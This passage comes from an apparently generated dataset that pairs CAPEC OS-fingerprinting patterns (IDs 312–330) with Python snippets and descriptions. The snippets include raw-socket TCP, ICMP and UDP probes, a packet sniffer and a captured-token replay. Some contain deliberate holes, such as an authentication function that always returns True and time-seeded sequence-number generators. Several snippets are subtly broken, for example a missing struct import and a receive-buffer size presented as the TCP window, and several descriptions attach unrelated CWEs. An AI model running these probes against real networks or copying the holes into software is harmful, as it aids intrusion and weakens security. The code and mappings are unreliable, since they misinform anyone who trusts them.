        "code_snippet": "import os\nimport platform\n\n# Active OS Fingerprinting\n# This script attempts to identify the OS by checking specific system files and commands\n\ndef active_os_fingerprinting():\n    try:\n        if platform.system() == 'Windows':\n            os_version = os.popen('ver').read()\n        else:\n            os_version = os.popen('uname -a').read()\n        return os_version\n    except Exception as e:\n        return str(e)\n\n# Example of a deprecated CWE-287: Authentication Bypass Issue\n# This function simulates an authentication bypass by always returning True\n\ndef authenticate(user, password):\n    return True  # Insecure: Bypasses actual authentication\n\n# Example of CWE-532: Information Exposure Through Debug Log Files\n# This function logs sensitive information to a debug file\n\ndef log_debug_info(info):\n    with open('debug.log', 'a') as f:\n        f.write(info + '\\n')\n\n# Example of CWE-589: Call to Non-ubiquitous API\n# This function uses a platform-specific API call\n\ndef platform_specific_call():\n    if platform.system() == 'Windows':\n        return os.popen('ipconfig').read()  # Windows-specific\n    else:\n        return os.popen('ifconfig').read()  # Unix-specific\n\n# Main function to demonstrate the vulnerabilities\nif __name__ == '__main__':\n    print('OS Fingerprinting Result:', active_os_fingerprinting())\n    print('Authentication Bypass Result:', authenticate('user', 'pass'))\n    log_debug_info('Sensitive information: User logged in')\n    print('Platform Specific Call Result:', platform_specific_call())",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the CAPEC-312: Active OS Fingerprinting and various CWEs. The `active_os_fingerprinting` function attempts to identify the operating system by executing system-specific commands, which is a form of active OS fingerprinting. The `authenticate` function represents a deprecated CWE-287 issue by bypassing actual authentication checks. The `log_debug_info` function demonstrates CWE-532 by logging sensitive information to a debug file. The `platform_specific_call` function shows CWE-589 by using platform-specific API calls that may not be available on all systems. This code is intentionally vulnerable to illustrate these security issues."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\n\n# Function to send a crafted packet to a target and analyze the response\ndef os_fingerprinting(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Craft a TCP packet with unusual flags/settings\n    packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # Example packet\n    \n    # Send the packet to the target\n    sock.sendto(packet, (target_ip, target_port))\n    \n    # Receive the response\n    response = sock.recv(1024)\n    \n    # Analyze the response to determine the OS\n    if response:\n        print(f'Response from {target_ip}: {response}')\n        # Here you would add logic to analyze the response and determine the OS\n    else:\n        print(f'No response from {target_ip}')\n\n# Example usage\nos_fingerprinting('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic form of active OS fingerprinting. It creates a raw socket and sends a crafted TCP packet with unusual flags/settings to a target IP address and port. The response from the target is then received and analyzed to infer the operating system. This process leverages the fact that different operating systems respond uniquely to anomalous packets, which can be used to identify the OS version. The code embodies the CAPEC concept of detecting the OS by probing with specific packets and observing the responses. The related CWEs are represented by the potential exposure of sensitive information (e.g., OS type/version) to an unauthorized actor through observable discrepancies in behavior."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to passively capture packets\ndef capture_packets(interface):\n    # Create a raw socket to capture packets\n    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    raw_socket.bind((interface, 0))\n    \n    while True:\n        packet = raw_socket.recvfrom(65565)[0]\n        eth_header = packet[0:14]\n        eth = struct.unpack('!6s6sH', eth_header)\n        eth_protocol = socket.ntohs(eth[2])\n        \n        # Check if the packet is an IP packet\n        if eth_protocol == 8:\n            ip_header = packet[14:34]\n            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)\n            ttl = iph[5]\n            src_ip = socket.inet_ntoa(iph[8])\n            \n            # Log the IP and TTL values\n            print(f'Source IP: {src_ip}, TTL: {ttl}')\n            \n            # Simulate storing sensitive trace data in an unprotected location\n            with open('trace_data.log', 'a') as f:\n                f.write(f'Source IP: {src_ip}, TTL: {ttl}\\n')\n\n# Example usage\ncapture_packets('eth0')",
        "description": "This Python code snippet demonstrates passive OS fingerprinting by capturing network packets on a specified interface. It uses a raw socket to capture all packets and extracts the IP header to log the source IP address and TTL (Time to Live) value. The TTL value can be used to infer the operating system of the source device. The code also simulates a vulnerability by storing the captured trace data in an unprotected log file, which can be accessed by unauthorized actors. This embodies the CAPEC concept of passive OS fingerprinting and highlights related CWEs such as exposure of sensitive information (CWE-200, CWE-497), improper management of sensitive trace data (CWE-1323), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport logging\n\n# CWE-532: Information Exposure Through Debug Log Files\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n# Function to perform active OS fingerprinting (CAPEC-312)\ndef os_fingerprinting(ip):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        sock.connect((ip, 80))\n        sock.send(b'HEAD / HTTP/1.1\\r\\nHost: ' + ip.encode() + b'\\r\\n\\r\\n')\n        response = sock.recv(1024)\n        sock.close()\n        logging.debug(f'Response from {ip}: {response}')\n        return response\n    except Exception as e:\n        logging.error(f'Error connecting to {ip}: {e}')\n        return None\n\n# Example usage\nresponse = os_fingerprinting('192.168.1.1')\nif response:\n    print('OS fingerprinting successful')\nelse:\n    print('OS fingerprinting failed')",
        "description": "This Python code snippet demonstrates a basic implementation of active OS fingerprinting (CAPEC-312) by sending an HTTP HEAD request to a specified IP address and logging the response. The logging mechanism is configured to write debug information to a file, which can lead to information exposure (CWE-532). The code attempts to connect to the target IP on port 80, send the request, and log the response for analysis. This process helps in identifying the operating system of the target machine based on the response characteristics."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\n\n# Vulnerable function to demonstrate TCP/IP fingerprinting and authentication bypass\n\ndef vulnerable_function(ip, port):\n    try:\n        # Create a socket connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((ip, port))\n\n        # Send a probe to identify the OS (TCP/IP Fingerprinting)\n        s.send(b'\\x00\\x00\\x00\\x00')\n        response = s.recv(1024)\n        print(f'Response: {response}')\n\n        # Simulate authentication bypass by replaying captured traffic\n        captured_auth = b'captured_auth_token'\n        s.send(captured_auth)\n        auth_response = s.recv(1024)\n        print(f'Auth Response: {auth_response}')\n\n        s.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nvulnerable_function('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a vulnerable function that embodies the main idea of CAPEC-312: Active OS Fingerprinting, with additional context from related CWEs. The function `vulnerable_function` connects to a specified IP and port, sends a probe to identify the OS (TCP/IP Fingerprinting), and then simulates an authentication bypass by replaying a captured authentication token. This example highlights the risks associated with TCP/IP fingerprinting and capture-replay attacks, as well as the potential for authentication bypass vulnerabilities."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import os\nimport socket\n\n# Vulnerable function to determine OS based on ICMP response\n# This is an example of Active OS Fingerprinting (CAPEC-312)\ndef get_os_by_icmp(ip):\n    try:\n        # Send ICMP echo request\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (ip, 1))\n        response = sock.recv(1024)\n        # Analyze ICMP response to fingerprint OS\n        if response[20:22] == b'\\x00\\x00':\n            return 'Windows'\n        elif response[20:22] == b'\\x03\\x03':\n            return 'Linux'\n        else:\n            return 'Unknown'\n    except Exception as e:\n        print(f'Error: {e}')\n        return 'Unknown'\n\n# Example usage\nip_address = '192.168.1.1'\nos_type = get_os_by_icmp(ip_address)\nprint(f'The OS of {ip_address} is {os_type}')",
        "description": "This Python code snippet demonstrates a vulnerable function for Active OS Fingerprinting (CAPEC-312) using ICMP probes. The function 'get_os_by_icmp' sends an ICMP echo request to a specified IP address and analyzes the response to determine the operating system. This technique can be exploited by attackers to gather information about the target system's OS, which can be used for further attacks. The code also touches on related CWEs, such as CWE-287 (Authentication Bypass Issues) and CWE-532 (Information Exposure Through Debug Log Files), by highlighting potential security risks in network communication and information exposure."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import socket\nimport time\n\ndef analyze_ip_id_sequence(target_ip):\n    ip_ids = []\n    for _ in range(5):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (target_ip, 0))\n        response = sock.recv(1024)\n        ip_id = int.from_bytes(response[4:6], byteorder='big')\n        ip_ids.append(ip_id)\n        time.sleep(1)\n    return ip_ids\n\ndef main():\n    target_ip = '192.168.1.1'\n    ip_ids = analyze_ip_id_sequence(target_ip)\n    print(f'IP ID sequence for {target_ip}: {ip_ids}')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic IP ID sequence analysis, which is a form of OS fingerprinting. The function `analyze_ip_id_sequence` sends ICMP echo requests (ping) to a target IP address and captures the IP ID field from the response packets. By analyzing the sequence of IP ID values, an attacker can infer the operating system of the target host. This technique leverages the fact that different operating systems generate IP ID numbers differently. The code also highlights potential vulnerabilities such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by exposing the IP ID sequence, which can be used to fingerprint the OS. The use of raw sockets and direct manipulation of IP packets can also be related to 'Reliance on IP Address for Authentication' (CWE-291) and 'Multiple Binds to the Same Port' (CWE-605) in more complex scenarios."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with a specific IP ID\ndef send_udp_probe(target_ip, target_port, ip_id):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    packet = b'\\x45\\x00\\x00\\x1c' + ip_id.to_bytes(2, 'big') + b'\\x00\\x00\\x40\\x11\\x00\\x00' + socket.inet_aton('192.168.1.1') + socket.inet_aton(target_ip) + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00' + b'\\x00\\x00'\n    sock.sendto(packet, (target_ip, target_port))\n\n# Function to receive ICMP error message\ndef receive_icmp_response():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    response, _ = sock.recvfrom(1024)\n    return response\n\n# Main function to perform the IP 'ID' Echoed Byte-Order Probe\ndef ip_id_echo_probe(target_ip, target_port, ip_id):\n    send_udp_probe(target_ip, target_port, ip_id)\n    response = receive_icmp_response()\n    echoed_ip_id = response[24:26]\n    if echoed_ip_id == ip_id.to_bytes(2, 'big'):\n        print(f\"IP ID {ip_id} echoed back correctly.\")\n    else:\n        print(f\"IP ID {ip_id} not echoed back correctly. Echoed: {echoed_ip_id.hex()}\")\n\n# Example usage\nip_id_echo_probe('192.168.1.100', 12345, 54321)",
        "description": "This Python code snippet demonstrates an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP packet with a specific IP ID to a closed port on a target host and then listens for an ICMP error message. The IP ID from the ICMP response is checked to see if it matches the sent IP ID, indicating whether the target host echoes back the IP ID value. This can reveal information about the target's operating system or router firmware. The code also touches on related CWEs by showing how sensitive information (IP ID) can be exposed and potentially mismanaged."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with the DF bit set\ndef send_udp_packet_with_df(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    \n    # Construct the IP header with the DF bit set\n    ip_header = b'\\x45\\x00\\x00\\x1c\\x1c\\x46\\x40\\x00\\x40\\x11\\x72\\xb7'  # Version, IHL, Type of Service, Total Length, ID, Flags (DF set), Fragment Offset, TTL, Protocol, Header Checksum\n    ip_header += socket.inet_aton('192.168.1.1')  # Source IP (example)\n    ip_header += socket.inet_aton(target_ip)  # Destination IP\n    \n    # Construct the UDP header\n    udp_header = b'\\x1f\\x90'  # Source Port (example)\n    udp_header += target_port.to_bytes(2, 'big')  # Destination Port\n    udp_header += b'\\x00\\x08'  # Length\n    udp_header += b'\\x00\\x00'  # Checksum\n    \n    # Send the packet\n    sock.sendto(ip_header + udp_header, (target_ip, target_port))\n\n# Example usage\nsend_udp_packet_with_df('192.168.1.2', 12345)",
        "description": "This Python code snippet demonstrates how to send a UDP packet with the 'Don't Fragment' (DF) bit set in the IP header to a specified target IP and port. The code creates a raw socket and constructs an IP header with the DF bit set, followed by a UDP header. The packet is then sent to the target. This code embodies the main idea of the CAPEC 'IP (DF) 'Don't Fragment Bit' Echoing Probe' by attempting to observe whether the target system echoes back the DF bit in the response packet. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and incorrectly specified destinations (CWE-941), which can be exploited through such probes."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport struct\n\n# Function to extract TCP timestamp from a TCP packet\ndef extract_tcp_timestamp(packet):\n    # TCP header starts after the IP header (20 bytes for IPv4)\n    tcp_header = packet[20:40]\n    # Unpack TCP header\n    tcp_fields = struct.unpack('!HHLLBBHHH', tcp_header)\n    # Extract TCP options (assuming no additional IP options)\n    tcp_options = packet[40:60]\n    # Check for TCP timestamp option (kind=8)\n    if tcp_options[0] == 8:\n        # Extract timestamp value\n        ts_val = struct.unpack('!L', tcp_options[2:6])[0]\n        return ts_val\n    return None\n\n# Create a raw socket to capture packets\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind to a specific interface (e.g., 'eth0')\n# sock.bind(('eth0', 0))\n\n# Capture packets\ntry:\n    while True:\n        packet, addr = sock.recvfrom(65535)\n        ts_val = extract_tcp_timestamp(packet)\n        if ts_val:\n            print(f'TCP Timestamp from {addr}: {ts_val}')\nexcept KeyboardInterrupt:\n    sock.close()",
        "description": "This Python code snippet demonstrates how to capture and extract TCP timestamps from network packets using a raw socket. The code creates a raw socket to listen for TCP packets, extracts the TCP header and options, and checks for the presence of a TCP timestamp option. If a timestamp is found, it prints the timestamp value along with the source address. This process can be used for OS fingerprinting by analyzing the timestamp values, as different operating systems update the timestamp at different intervals. The code embodies the main idea of the CAPEC by showing how an attacker can probe TCP services to gather timestamp information, which can then be used to infer the operating system of the target. The related CWEs provide context on the potential vulnerabilities and risks associated with exposing sensitive information, such as TCP timestamps, to unauthorized actors."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport time\n\n# Vulnerable PRNG seed\nseed = int(time.time())\n\n# Function to generate predictable TCP sequence number\ndef generate_sequence_number(ack_number):\n    return (ack_number + seed) % 4294967296  # 32-bit sequence number\n\n# Create a socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind to a port (vulnerable to multiple binds)\ntry:\n    s.bind(('0.0.0.0', 12345))\nexcept socket.error as e:\n    print(f'Bind failed: {e}')\n    exit()\n\n# Listen for incoming connections\ns.listen(1)\nprint('Listening on port 12345...')\n\n# Accept a connection\nconn, addr = s.accept()\nprint(f'Connection from {addr}')\n\n# Receive a packet (simplified)\npacket = conn.recv(1024)\nack_number = int.from_bytes(packet[:4], 'big')\n\n# Generate a predictable sequence number\nseq_number = generate_sequence_number(ack_number)\nprint(f'Generated sequence number: {seq_number}')\n\n# Send a response (in cleartext)\nresponse = seq_number.to_bytes(4, 'big')\nconn.send(response)\n\n# Close the connection\nconn.close()\ns.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of TCP sequence number generation, embodying the main idea of the CAPEC 'TCP Sequence Number Probe'. The code uses a predictable seed for the pseudo-random number generator (PRNG), which is based on the current time (CWE-337). This makes the sequence numbers predictable. The code also binds to a port and listens for incoming connections, which could be vulnerable to multiple binds (CWE-605). When a connection is received, it generates a sequence number based on the acknowledgment number from the received packet and the predictable seed. The generated sequence number is then sent back in cleartext (CWE-319), exposing it to potential sniffing. This setup allows an attacker to fingerprint the operating system based on the predictable sequence number generation."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport struct\nimport random\n\n# Function to generate a random TCP sequence number\ndef generate_isn():\n    return random.randint(0, 4294967295)\n\n# Function to send TCP SYN packets and analyze ISN\ndef analyze_isn(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header\n        ip_header = struct.pack('!BBHHHBBH4s4s',\n                                69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,\n                                socket.inet_aton('192.168.1.100'), socket.inet_aton(target_ip))\n\n        # Construct TCP header\n        isn = generate_isn()\n        tcp_header = struct.pack('!HHLLBBHHH',\n                                 12345, target_port, isn, 0, 80, 2, 8192, 0, 0)\n\n        # Send SYN packet\n        packet = ip_header + tcp_header\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive SYN/ACK response\n        response = sock.recv(1024)\n        isn_response = struct.unpack('!L', response[24:28])[0]\n\n        print(f'Received ISN: {isn_response}')\n\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nanalyze_isn('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends a TCP SYN packet to a specified target IP and port, then captures and analyzes the Initial Sequence Number (ISN) from the SYN/ACK response. The code uses raw sockets to construct and send the TCP packet, and it prints the received ISN for analysis. This technique can be used to fingerprint the operating system of the target machine based on its ISN generation pattern. The code also highlights potential vulnerabilities such as exposure of sensitive system information (CWE-497) and cleartext transmission of sensitive data (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport random\n\nclass TCPISNProbe:\n    def __init__(self):\n        self.isn = random.randint(0, 2**32 - 1)\n        self.increment_rate = random.randint(1000, 5000)  # ISN increment rate per second\n\n    def get_isn(self):\n        current_time = time.time()\n        time.sleep(random.uniform(0.01, 0.1))  # Simulate network delay\n        new_isn = self.isn + int((time.time() - current_time) * self.increment_rate)\n        return new_isn\n\n# Simulate the probe\nprobe = TCPISNProbe()\ninitial_isn = probe.get_isn()\ntime.sleep(1)  # Wait for some time to measure the increment rate\nfinal_isn = probe.get_isn()\n\nincrement_rate_measured = (final_isn - initial_isn)\nprint(f\"Measured ISN increment rate: {increment_rate_measured} per second\")",
        "description": "This Python code snippet simulates a TCP Initial Sequence Number (ISN) probe, which measures the rate of ISN increments over time. The `TCPISNProbe` class initializes with a random ISN and an increment rate. The `get_isn` method calculates the new ISN based on the elapsed time and the increment rate, simulating a network delay to mimic real-world conditions. The probe measures the ISN increment rate by capturing the ISN at two different times and calculating the difference. This approach can be used to infer the operating system based on the ISN increment pattern, which is the main idea of the CAPEC. The code also touches on related CWEs such as exposure of sensitive information (CWE-200) and covert timing channels (CWE-385) by demonstrating how timing information can be used to infer protected information."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import time\nimport random\n\n# Vulnerable PRNG using predictable seed\nclass PredictablePRNG:\n    def __init__(self):\n        # Using current time as seed, which is predictable\n        self.seed = int(time.time())\n        random.seed(self.seed)\n\n    def get_sequence_number(self):\n        # Generate a pseudo-random sequence number\n        return random.randint(0, 2**32 - 1)\n\n# Simulate TCP ISN generation\nprng = PredictablePRNG()\nsequence_number = prng.get_sequence_number()\nprint(f\"Generated TCP ISN: {sequence_number}\")\n\n# Exposing sensitive information\nprint(f\"Seed used for PRNG: {prng.seed}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a Pseudo-Random Number Generator (PRNG) for generating TCP Initial Sequence Numbers (ISNs). The PRNG is seeded with the current time, which is predictable (CWE-337). An attacker can observe the system time and predict the sequence numbers generated by this PRNG (CWE-341). Additionally, the code exposes the seed value used for the PRNG, which is sensitive information (CWE-200). This example embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe' by showing how predictable sequence numbers can be generated and how sensitive information can be exposed."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with ECN flags set\nip_header = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # Simplified IP header\nsrc_ip = socket.inet_aton('192.168.1.1')\ndst_ip = socket.inet_aton('192.168.1.2')\ntcp_header = b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x71\\x10\\x00\\x00\\x00\\x00'  # Simplified TCP header with ECN flags\npacket = ip_header + src_ip + dst_ip + tcp_header\n\n# Send the packet\nsock.sendto(packet, ('192.168.1.2', 0))\n\n# Receive the response\nresponse = sock.recv(1024)\n\n# Check for ECN support in the response\nif response[33] & 0x03:  # Check ECN flags in the TCP header\n    print('ECN supported')\nelse:\n    print('ECN not supported')",
        "description": "This Python code snippet demonstrates a TCP Congestion Control Flag (ECN) probe, which is used to check if a remote host supports Explicit Congestion Notification (ECN) messaging. The code creates a raw socket and constructs a TCP packet with ECN flags set. It then sends this packet to a target IP address and waits for a response. By examining the ECN flags in the response, the code determines if the remote host supports ECN. This probe can expose sensitive information about the remote host's network stack (CWE-200) and can be used to identify systems that do not properly handle ECN messages (CWE-1320). Additionally, the code does not include integrity checks (CWE-353) and transmits data in cleartext (CWE-319), making it vulnerable to sniffing and tampering."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\n\n# Function to establish a TCP connection and check the initial window size\ndef check_initial_window_size(target_ip, target_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the target IP and port\n        s.connect((target_ip, target_port))\n        \n        # Get the initial window size\n        initial_window_size = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)\n        \n        # Print the initial window size\n        print(f\"Initial Window Size: {initial_window_size}\")\n        \n        # Close the socket\n        s.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\ncheck_initial_window_size('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates how to establish a TCP connection to a target IP and port, and then retrieve the initial TCP window size. The function `check_initial_window_size` creates a socket, connects to the specified target, and uses the `getsockopt` method to obtain the initial window size. This value is then printed to the console. The code embodies the main idea of the CAPEC 'TCP Initial Window Size Probe' by showing how to probe the initial window size of a TCP connection, which can be used for OS fingerprinting. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and reliance on data/memory layout (CWE-188), which can be exploited through such probing techniques."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to a specific interface and port\nsock.bind(('0.0.0.0', 0))\n\n# Enable socket options to capture TCP options\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n# Function to parse TCP options\ndef parse_tcp_options(tcp_header):\n    options = []\n    offset = 20  # TCP header size without options\n    while offset < len(tcp_header):\n        kind = tcp_header[offset]\n        if kind == 0:  # End of options\n            break\n        elif kind == 1:  # No-Operation\n            offset += 1\n            continue\n        length = tcp_header[offset + 1]\n        options.append(tcp_header[offset:offset + length])\n        offset += length\n    return options\n\n# Capture and analyze TCP packets\nwhile True:\n    packet, addr = sock.recvfrom(65535)\n    ip_header = packet[:20]\n    tcp_header = packet[20:40]\n    tcp_options = parse_tcp_options(tcp_header)\n    print(f'Received TCP options from {addr}: {tcp_options}')",
        "description": "This Python code snippet creates a raw socket to capture and analyze TCP packets, specifically focusing on the TCP options present in the packets. The code binds the socket to all interfaces and enables the inclusion of the IP header in the captured packets. The `parse_tcp_options` function extracts and prints the TCP options from the captured packets. This code embodies the main idea of the CAPEC 'TCP Options Probe' by analyzing the type and order of TCP header options in response segments. The related CWEs are represented by the potential exposure of sensitive information (CWE-200) through the captured TCP options, reliance on data layout (CWE-188) in parsing the TCP options, and the possibility of multiple binds to the same port (CWE-605) if the code is modified to allow such behavior."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with RST flag and a text payload\nsrc_ip = '192.168.1.2'\ndst_ip = '192.168.1.1'\nsrc_port = 12345\ndst_port = 80\nseq = 0\nack_seq = 0\noffset_res = (5 << 4) | 0\nflags = 0x04  # RST flag\nwindow = socket.htons(5840)\nchecksum = 0\nurg_ptr = 0\n\n# TCP header fields\ntcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, checksum, urg_ptr)\n\n# Text payload\npayload = b'Connection reset by peer'\n\n# Calculate checksum (for simplicity, not implemented here)\n# checksum = calculate_checksum(tcp_header + payload)\n\n# Final TCP packet\npacket = tcp_header + payload\n\n# Send the packet\nsock.sendto(packet, (dst_ip, 0))",
        "description": "This Python code snippet demonstrates the creation and sending of a TCP packet with the RST (reset) flag set, including a human-readable text payload. This is an example of a TCP 'RST' Flag Checksum Probe, which can be used for OS fingerprinting. The code constructs a raw TCP packet with the RST flag and a text message in the payload, then sends it to a specified destination IP and port. This can expose sensitive information (CWE-200) if the target system responds with a human-readable message. The code does not include integrity checks (CWE-353, CWE-354) and transmits data in cleartext (CWE-319), making it vulnerable to sniffing and replay attacks (CWE-294)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a specified host and port\n# and receive an ICMP error message in response\n\ndef send_udp_packet(host, port):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(2)\n\n        # Send a UDP packet to the specified host and port\n        message = b'Test Message'\n        sock.sendto(message, (host, port))\n\n        # Try to receive a response (expecting an ICMP error message)\n        try:\n            data, addr = sock.recvfrom(1024)\n            print(f'Received data: {data}')\n        except socket.timeout:\n            print('No response received (expected for closed port)')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nsend_udp_packet('192.0.2.1', 12345)",
        "description": "This Python code snippet demonstrates how to send a UDP packet to a specified host and port, and then attempt to receive an ICMP error message in response. The main idea is to probe the target system by sending a UDP packet to a closed port, which should trigger an ICMP 'Port Unreachable' error message. The code then attempts to capture and print the data from the ICMP error message, which may contain sensitive information. This embodies the CAPEC 'ICMP Error Message Quoting Probe' by illustrating how an adversary might use ICMP error messages to gather information about a target system. The related CWEs are represented by the potential exposure of sensitive information in the error message."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\n\n# Function to send an ICMP Echo Request\ndef send_icmp_echo_request(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    icmp_echo_request = b'\\x08\\x00\\x00\\x00' + b'\\x00' * 56  # ICMP Echo Request header + payload\n    sock.sendto(icmp_echo_request, (target_ip, 1))\n\n# Function to receive ICMP Error Message\ndef receive_icmp_error_message():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    while True:\n        data, addr = sock.recvfrom(1024)\n        if data[20:22] in [b'\\x03\\x01', b'\\x03\\x03', b'\\x03\\x04', b'\\x0b\\x00', b'\\x0b\\x01']:  # ICMP Error Types\n            print(f'Received ICMP Error Message from {addr[0]}: {data[28:]}')  # Quoted data from original request\n            break\n\n# Main function to demonstrate the vulnerability\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'  # Example target IP\n    send_icmp_echo_request(target_ip)\n    receive_icmp_error_message()",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP Error Message Echoing Integrity Probe' attack. The code sends an ICMP Echo Request to a target IP address and then listens for ICMP Error Messages. When an ICMP Error Message is received, it prints the quoted data from the original request. This can expose sensitive information (CWE-200, CWE-211) and demonstrates the lack of integrity checks (CWE-353). The code highlights how an adversary can exploit ICMP error messages to gather information about the target system."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
